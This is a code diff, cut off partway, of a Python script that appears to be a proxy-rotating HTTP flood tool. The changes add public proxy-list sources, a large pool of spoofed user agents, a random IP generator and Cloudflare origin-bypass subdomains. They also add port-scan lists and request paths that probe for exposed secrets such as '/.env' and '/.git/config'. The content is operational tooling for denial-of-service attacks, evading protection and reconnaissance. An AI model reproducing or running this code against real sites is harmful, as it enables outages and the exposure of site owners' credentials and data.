@@ -1,6 +1,7 @@
 import sys
 import os
 import ssl
+import io
 import time
 import random
 import socket
@@ -8,135 +9,209 @@ import asyncio
 import aiohttp
 import threading
 import base64
+import msvcrt
+from collections import deque
 from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-PROXY_LIST = [
-    "81.177.160.200:80","190.110.226.122:80","150.136.163.51:80","114.111.151.41:80",
-    "103.87.149.14:80","176.61.151.123:80","219.93.101.63:80","190.119.132.61:80",
-    "12.50.107.217:80","198.111.166.184:80","167.99.124.118:80","41.184.92.220:80",
-    "47.238.103.100:8888","135.148.120.6:80","197.221.240.176:80","197.221.249.196:80",
-    "168.138.50.91:80","65.108.103.19:80","103.205.64.153:80","183.110.216.159:8090",
-    "183.110.216.128:8090","197.221.237.248:80","27.34.242.98:80","118.163.120.181:58837",
-    "34.140.137.151:80","168.110.52.228:3128","34.135.166.24:80","195.158.8.123:3128",
-    "35.209.198.222:80","65.108.203.36:18080","159.65.221.25:80","39.109.113.97:4090",
-    "145.241.117.33:8888","41.220.16.209:80","219.249.37.107:8382","143.42.66.91:80",
-    "173.212.245.136:8888","197.255.126.69:80","174.138.119.88:80","197.221.240.178:80",
-    "197.221.234.253:80","219.93.101.62:80","154.65.39.7:80","34.81.160.132:80",
-    "211.38.188.120:9080","45.10.163.12:80","147.231.163.133:80","202.133.88.173:80",
-    "157.90.10.15:3128","86.104.74.110:1081","41.220.16.208:80","12.50.107.221:80",
-    "12.50.107.222:80","91.132.92.231:80","43.133.44.89:8888","188.165.199.207:80",
-    "197.221.240.246:80","47.83.168.191:4000","197.221.249.197:80","190.119.132.62:80",
-    "167.71.182.192:80","97.213.92.28:80","20.164.75.153:8080","13.80.134.180:80",
-    "141.147.9.254:80","197.221.234.149:80","206.206.126.177:2412","65.108.203.35:28080",
-    "196.223.129.21:80","178.156.224.42:3128","51.159.28.39:80","43.205.124.6:3128",
-    "175.139.233.78:80","119.235.112.42:3128","94.158.49.82:3128","197.221.234.252:80",
-    "197.221.240.247:80","103.35.190.69:1082","41.220.22.7:80","41.220.16.215:80",
-    "46.47.197.210:3128","46.249.100.124:80","193.160.209.58:1080","8.219.97.248:80",
-    "103.65.237.92:5678","219.93.101.60:80","203.99.240.182:80","32.223.6.94:80",
-    "12.50.107.220:80","45.125.67.37:8443","185.82.218.85:80","185.214.108.46:40000",
-    "124.108.6.20:8085","15.235.131.237:8080","212.47.232.28:80","78.28.152.111:80",
-    "219.65.73.81:80","103.125.31.222:80","41.220.16.213:80","45.229.17.17:999",
-    "170.245.132.80:999","139.135.182.132:8081","138.91.159.185:80","196.1.93.10:80",
-    "197.221.240.240:80","60.249.94.208:3128","150.107.140.238:3128","195.26.224.135:80",
-    "41.220.16.218:80","5.161.103.41:88","75.84.71.14:80","37.187.74.125:80",
-    "172.237.73.24:80","185.85.111.18:80","23.247.136.254:80","50.122.86.118:80",
-    "113.160.132.26:8080","8.211.166.184:8081","12.50.107.219:80","84.47.150.125:1080",
-    "104.230.113.255:80","89.58.55.33:80","194.150.110.134:80","212.231.191.23:80",
-    "213.33.126.130:80","174.104.115.21:80","34.122.187.196:80","89.116.51.164:8080",
-    "77.110.119.136:3128","80.74.54.148:3128","139.162.200.213:80","62.113.119.14:8080",
-    "170.64.170.204:8080","147.45.178.211:14658","104.225.220.233:80","34.44.49.215:80",
-    "200.174.198.32:8888","97.74.87.226:80","66.135.16.53:80","179.106.29.223:9090",
-    "195.133.250.173:3127","38.156.23.41:999","167.99.236.14:80","175.139.233.76:80",
-    "194.150.220.163:1082","210.223.44.230:3128","133.18.234.13:80","45.146.243.133:1080",
-    "201.134.41.110:443","197.221.249.199:80","64.188.77.26:3128","175.101.240.38:80",
-    "5.161.50.82:8118","41.220.16.211:80","41.220.16.214:80","46.29.162.166:80",
-    "143.198.135.176:80","147.75.34.105:443","103.189.250.121:8080","162.240.19.30:80",
-    "167.71.222.124:10001","38.60.196.214:80","91.217.81.131:1080","197.221.249.198:80",
-    "82.114.228.67:1080","65.108.203.37:28080","195.231.69.203:80","14.143.222.113:57788",
-    "109.135.16.145:8789","160.25.237.163:1111","103.97.140.64:8080","185.216.106.227:6304",
-    "31.57.82.127:6708","45.61.121.216:6815","142.111.192.194:5790","82.23.206.133:5939",
-    "206.232.103.144:6301","107.173.36.96:5551","161.123.5.67:5116","198.46.148.19:5707",
-    "154.6.126.120:6091","82.26.212.156:5963","136.0.108.165:5841","185.226.204.141:5694",
-    "142.147.132.164:6359","45.39.4.109:5534","45.127.250.194:5803","82.23.203.63:5371",
-    "142.111.113.225:6586","173.239.219.159:6068","206.206.73.113:6729","173.239.219.141:6050",
-    "184.174.56.189:5201","192.154.250.70:5650","216.74.115.104:6698","198.89.123.103:6645",
-    "92.113.1.16:5716","161.123.33.139:6162","142.147.245.167:5858","89.116.78.61:5672",
-    "198.37.121.173:6593","192.241.125.132:8176","172.120.106.203:6358","191.101.188.91:6845",
-    "45.61.96.2:5982","45.43.70.160:6447","45.41.179.160:6695","192.177.103.54:6547",
-    "67.227.37.161:5703","173.239.219.65:5974","185.216.106.157:6234","216.74.114.159:6442",
-    "104.232.209.21:5979","107.175.56.128:6401","172.120.106.191:6346","104.233.15.197:5920",
-    "173.239.219.202:6111","38.154.191.224:8801","179.61.245.39:6818","173.244.41.156:6340",
-    "182.93.85.225:8080","166.88.85.12:6092","161.123.5.213:5262","107.172.116.12:5468",
-    "45.41.176.19:6317","104.232.209.144:6102","104.239.13.171:6800","84.46.204.213:6516",
-    "45.56.175.85:5759","86.38.154.198:5841","198.23.128.137:5765","161.123.101.80:6706",
-    "142.111.126.16:6743","147.124.198.36:5895","45.135.139.129:6432","104.239.105.25:6555",
-    "45.39.4.229:5654","166.88.58.115:5840","104.232.211.166:5779","192.210.132.194:6164",
-    "206.232.103.64:6221","107.181.154.82:5760","166.88.155.28:6187","162.220.246.183:6467",
-    "38.154.191.251:8828","199.180.9.111:6131","107.181.148.128:5988","84.46.204.247:6550",
-    "103.47.53.28:8326","45.43.64.222:6480","45.61.125.82:6093","198.46.241.228:6763",
-    "199.180.9.214:6234","166.88.3.168:6639","154.29.233.178:5939","136.0.109.181:6467",
-    "89.249.195.11:6766","89.116.78.87:5698","31.56.137.233:6309","45.61.100.183:6451",
-    "198.105.111.41:6719","154.6.23.171:6638","185.216.105.110:6687","188.215.5.249:5279",
-    "107.181.148.89:5949","145.223.44.211:5894","162.220.246.88:6372","45.61.96.48:6028",
-    "45.41.179.151:6686","104.253.48.92:5516","104.239.104.113:6337","198.23.239.188:6594",
-    "173.0.10.179:6355","173.211.30.152:6586","161.123.115.134:5155","107.175.135.160:6601",
-    "192.177.87.19:5865","154.30.242.224:9618","191.101.25.12:6409","107.172.221.249:6204",
-    "192.154.250.176:5756","23.236.182.114:5890","45.61.118.245:5942","142.111.192.183:5779",
-    "45.43.64.214:6472","45.43.64.63:6321","67.227.14.144:6736","184.174.30.244:5913",
-    "104.253.48.70:5494","172.120.120.30:5185","173.244.41.120:6304","45.61.127.251:6190",
-    "45.43.70.238:6525","84.46.204.97:6400","185.226.204.191:5744","23.229.19.216:8811",
-    "89.116.78.7:5618","198.105.122.23:6596",
+PROXY_SOURCES = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
+    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
+    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://www.proxy-list.download/api/v1/get?type=https",
+    "https://api.openproxylist.xyz/http.txt",
+    "https://api.openproxylist.xyz/https.txt",
+    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
+    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
+    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
+    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt",
+    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/proxies.txt",
+    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
+    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
+    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
+    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/http.txt",
+    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/https.txt",
+    "https://proxyspace.pro/http.txt",
+    "https://proxyspace.pro/https.txt",
+    "https://sunny9577.github.io/proxy-scraper/proxies.txt",
+    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite",
+    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
+    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
+    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=https&proxy_format=ipport&format=text&timeout=20000",
 ]
+
+PROXY_CACHE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_cache.txt")
+VALIDATION_TIMEOUT = 3.0
+MAX_PROXY_LATENCY = 2.5
+MIN_PROXY_POOL = 20
 
 UA_LIST = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.113 Mobile Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 OPR/115.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/116.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.3 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; CrOS x86_64 16033.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; CrOS aarch64 16074.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/140.0.0.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.113 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; CPH2651) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; 2311DRK48G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; HarmonyOS; ALN-AL80) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-X816B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/139.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Android 15; Mobile; rv:139.0) Gecko/139.0 Firefox/139.0",
+    "Mozilla/5.0 (Android 14; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/140.0 Mobile/15E148 Safari/605.1.15",
+    "Mozilla/5.0 (SMART-TV; Linux; Tizen 8.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 TV Safari/537.36",
+    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 WebAppManager",
+    "Mozilla/5.0 (PlayStation 5; CPU 4.00GHz) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+    "Mozilla/5.0 (Xbox Series X; Xbox;rv:130.0) Gecko/20100101 Firefox/130.0",
+    "Mozilla/5.0 (Linux; Android 11; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/130.0.0.0 Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/24.4 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-S938U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 16; CPH2699) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; 2412DPN0C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.6; rv:142.0) Gecko/20100101 Firefox/142.0",
+    "Mozilla/5.0 (Android 16; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0",
+    "Mozilla/5.0 (Linux; Android 15; SM-X916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
 ]
 
-PATHS = [
-    "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
-    "/index.html", "/index.php", "/home", "/about", "/contact",
-    "/api/v1/users", "/api/v2/status", "/api/health",
-    "/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
-    "/admin/", "/login", "/signup", "/search?q={}",
-]
+PRIMARY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
+                 "/index.html", "/index.php", "/home"]
+SECONDARY_PATHS = ["/about", "/contact", "/login", "/signup",
+                   "/api/v1/users", "/api/v2/status", "/api/health",
+                   "/api/v1/", "/api/v2/", "/api/users", "/api/products"]
+FUZZ_PATHS = ["/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
+              "/admin/", "/search?q={}", "/dashboard", "/panel",
+              "/.env", "/.git/config", "/.well-known/security.txt",
+              "/wp-content/plugins/", "/wp-content/themes/",
+              "/server-status", "/phpinfo.php", "/info.php",
+              "/api/v3/auth", "/oauth/token", "/cpanel", "/webmail",
+              "/api/orders", "/api/graphql"]
 
-PORTS_TO_SCAN = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5800, 5900, 6379, 8080, 8443, 8888, 9090, 27017]
+PORTS_TO_SCAN = [21,22,25,53,80,110,143,443,465,587,993,995,1433,1521,3306,3389,5432,5800,5900,6379,8080,8443,8888,9090,27017]
+CF_SUBS = ["direct","origin","direct-connect","cpanel","webmail","mail","ftp","dev","staging","api","www","cdn","gateway","admin"]
+SUBDOMAIN_COMMON = ["www","mail","ftp","dev","staging","api","admin","blog","shop","cdn","m","mobile","app","dashboard","panel","cpanel","webmail","vpn","ns1","ns2","dns","gateway","portal","test","support","status","monitor","metrics","logs","docs","help","kb","wiki","assets","static","media","img","images","files","download","secure","ssl","auth","sso","login","account","billing","cloud","host","server","remote"]
 
-CF_SUBS = ["direct", "origin", "direct-connect", "cpanel", "webmail", "mail", "ftp", "dev", "staging", "api"]
+TECH_SIGNATURES = {
+    "Cloudflare":["cf-ray","__cfduid","cf-cache-status","cloudflare"],
+    "CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
+    "Akamai":["x-akamai-transformed"],
+    "Fastly":["x-served-by","x-cache-hits"],
+    "Nginx":["server: nginx"],
+    "Apache":["server: apache"],
+    "IIS":["server: microsoft-iis"],
+    "PHP":["x-powered-by: php"],
+    "Node.js":["x-powered-by: express"],
+    "WordPress":["wp-json","wp-content"],
+}
 
 running = True
+stopped = False
 lock = threading.Lock()
 total_sent = 0
-total_ok = 0
-total_err = 0
-last_status = 0
-req_rate = 0
-rate_samples = []
+total_failed = 0
+total_success = 0
+last_http_code = 0
+last_code_label = ""
+req_rate = 0.0
+rate_times = deque(maxlen=400)
 proxy_pool = []
+proxy_alive = 0
 proxy_index = 0
 proxy_lock = threading.Lock()
-bypass_premium = False
-proxy_attack = False
-
+bypass_active = False
+proxy_mode = False
+known_good_paths = []
+total_proxy_used = 0
+total_direct_used = 0
+proxy_validate_done = threading.Event()
+proxy_validate_result = []
 
 def gen_ip():
     r = random.randint
     return f"{r(1,223)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"
-
 
 def next_proxy():
     global proxy_index
@@ -147,6 +222,235 @@ def next_proxy():
         proxy_index = (proxy_index + 1) % len(proxy_pool)
         return f"http://{p}"
 
+def remove_bad_proxy(proxy_str):
+    global proxy_pool, proxy_alive
+    clean = proxy_str.replace("http://", "")
+    with proxy_lock:
+        if clean in proxy_pool:
+            proxy_pool.remove(clean)
+            proxy_alive = len(proxy_pool)
+            _save_proxy_cache()
+
+def pick_path():
+    if bypass_active and known_good_paths and random.random() < 0.7:
+        return random.choice(known_good_paths)
+    r = random.random()
+    if r < 0.40:
+        return random.choice(PRIMARY_PATHS)
+    elif r < 0.75:
+        return random.choice(SECONDARY_PATHS)
+    return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))
+
+def code_label(code):
+    m = {200:"OK",201:"CREATED",301:"MOVED",302:"FOUND",304:"NOT MODIFIED",
